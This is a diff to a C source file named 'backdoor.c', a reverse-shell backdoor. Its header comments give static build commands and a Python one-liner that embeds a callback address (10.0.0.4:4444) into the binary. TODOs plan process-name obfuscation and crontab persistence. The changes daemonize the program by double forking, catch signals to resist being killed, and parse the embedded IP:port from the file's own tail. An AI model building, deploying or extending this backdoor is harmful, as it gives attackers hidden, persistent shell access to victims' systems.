@@ -1,3 +1,11 @@
+// yum install glibc-static
+// gcc backdoor.c -static-libgcc -static -fPIC -s -Os -o backdoor
+// python -c "open('backdoor', 'ab').write(b'\x0010.0.0.4:4444')"
+
+// TODO: 防止重复运行
+// TODO: 混淆进程名称
+// TODO: 写crontab
+
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -12,15 +20,15 @@
 
 #define LEN 64
 
-char basic_shell[] = "/bin/sh";
-char bash_shell[] = "/bin/bash";
-char* shell = bash_shell;
+const char sh[] = "/bin/sh";
+const char* shell = NULL;
 
 __pid_t child_pid;
 uint16_t conn_port=4444;
 char conn_ip[LEN];
 
-char* check_shell();
+const char* check_shell();
+void block_signal(int signal);
 int read_config(const char* filename);
 void usage(const char*);
 __sighandler_t _daemon();
@@ -32,6 +40,7 @@ __sighandler_t child_process();
 
 
 int main(int argc, const char **argv, const char **envp) {
+    int i, en;
     shell = check_shell();
     if (NULL == shell) {
         puts("ERROR: cannot find available shell.");
@@ -40,8 +49,16 @@ int main(int argc, const char **argv, const char **envp) {
 
     if (1 == argc) {
         puts("INFO: read config from itself.");
-        read_config(argv[0]);
-        
+        int en = read_config(argv[0]);
+        if (-1 == en) {
+            puts("ERROR: cannot read self.");
+        } else if (0 == en) {
+            puts("ERROR: parse self config error.");
+        }
+        if (en <= 0) {
+            usage(argv[0]);
+            return -1;
+        }
         // return -2;
     } else if (3 == argc) {
         strncpy(conn_ip, argv[1], LEN);
@@ -56,12 +73,12 @@ int main(int argc, const char **argv, const char **envp) {
         usage(argv[0]);
         return -1;
     }
-    printf("INFO: use shell {%s} to reverse.\n", shell);
+    // printf("INFO: use shell {%s} to reverse.\n", shell);
     printf("INFO: connect to %s:%hu\n", conn_ip, conn_port);
     
-    //----
+    //---- debug ----
     // return -2;
-    //----
+    //---- debug ----
 
     if (fork()) {
         exit(0);
@@ -70,35 +87,44 @@ int main(int argc, const char **argv, const char **envp) {
     if (fork()) {
         exit(0);
     }
-    signal(SIGSTOP, SIG_IGN);
+    for (i = 0; i < 32; i++) {
+        signal(i, block_signal);
+    }
+    // signal(SIGSTOP, SIG_IGN);
     _daemon();
     return 0;
 }
 
-char* check_shell() {
+const char* check_shell() {
     int ret = 0;
-    ret = access(bash_shell, X_OK);
+    ret = access(sh, X_OK);
     if (0 == ret) {
-        shell = bash_shell;
+        shell = sh;
     } else {
-        ret = access(basic_shell, X_OK);
-        if (0 == ret) {
-            shell = basic_shell;
-        } else {
-            shell = NULL;
-        }
+        shell = NULL;
     }
     return shell;
 }
 
+void block_signal(int signal) {
+    printf("INFO: block signal %d.\n", signal);
+    // return (__sighandler_t)0;
+}
+
+/**
+ * return 1 success
+ * return 0 not get ip and port
+ * return -1 read file error
+ */
 int read_config(const char* filename) {
     FILE* f = fopen(filename, "rb");
-    char buf[6];
-    int i = 0;
-    memset(buf, 0, 6);
+    char buf[LEN];
+    char c;
+    int i = 0, start = -1, colon = -1;
+    memset(buf, 0, LEN);
     if (NULL != f) {
-        fseek(f, -6, SEEK_END);
-        fread(buf, 1, 6, f);
+        fseek(f, -LEN, SEEK_END);
+        fread(buf, 1, LEN, f);
         fclose(f);
         // for (i = 0; i < 6; i++) {
         //     printf("%hhX\t", buf[i]);
@@ -107,11 +133,38 @@ int read_config(const char* filename) {
         // printf("%hhu.%hhu.%hhu.%hhu\n", buf[0], buf[1], buf[2], buf[3]);
         // printf("%hhX\t%hhX", buf[4], buf[5]);
         // printf("%hu\n", ((uint16_t)buf[4] << 8) | (uint16_t)buf[5]);
-        sprintf(conn_ip, "%hhu.%hhu.%hhu.%hhu", buf[0], buf[1], buf[2], buf[3]);
-        conn_port = ((uint16_t)buf[4] << 8) | (uint16_t)buf[5];
-        return 1;
+        for (i = 1; i < LEN; i++) {
+            c = buf[i];
+            if ((0 == buf[i - 1]) && c >= '0' && c <= '9') {
+                start = i;
+                // printf("DEBUG: start = %d\n", start);
+                break;
+            }
+        }
+        if (start > 0) {
+            for (i = start + 7; i < LEN; i++) {
+                c = buf[i];
+                if (c == ':') {
+                    colon = i;
+                    // printf("DEBUG: colon = %d\n", colon);
+                    break;
+                }
+            }
+        }
+        if (colon > 0) {
+            memset(conn_ip, 0, LEN);
+            memcpy(conn_ip, buf + start, colon - start);
+            // printf("DEBUG: conn_ip = %s\n", conn_ip);
+            conn_port = (uint16_t)strtol(buf + colon + 1, NULL, 10);
+            // printf("DEBUG: conn_port = %d\n", conn_port);
+            return 1;
+        }
+        
+        // sprintf(conn_ip, "%hhu.%hhu.%hhu.%hhu", buf[0], buf[1], buf[2], buf[3]);
+        // conn_port = ((uint16_t)buf[4] << 8) | (uint16_t)buf[5];
+        return 0;
     }
-    return 0;
+    return -1;
 }
 
 void usage(const char* bin) {
